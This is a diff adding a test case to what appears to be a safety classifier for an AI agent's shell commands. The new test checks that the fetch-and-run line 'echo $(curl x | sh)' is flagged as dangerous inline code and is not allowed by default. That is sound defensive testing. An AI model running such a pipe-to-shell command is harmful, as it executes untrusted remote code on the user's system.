@@ -197,6 +197,11 @@ test("an opaque segment is no built-in allow, and (PR C) not on the judge-first 
     assert.equal(dangerMatch({ tool: "bash", input: { command: l }, text: l, segments: segs }, denv()), null, l);
     assert.equal(lineDefault(l, segs, dctx()), null, l);
   }
+  // a shell fed on stdin inside a substitution is judge-first (danger-inline-code); it is still no built-in allow
+  const l = "echo $(curl x | sh)";
+  const segs = parseShell(l, { cwd: wt });
+  assert.equal(dangerMatch({ tool: "bash", input: { command: l }, text: l, segments: segs }, denv())?.name, "danger-inline-code", l);
+  assert.equal(lineDefault(l, segs, dctx()), null, l);
 });
 
 test("default-role-launch is narrowed to the owned roots (item 3)", () => {
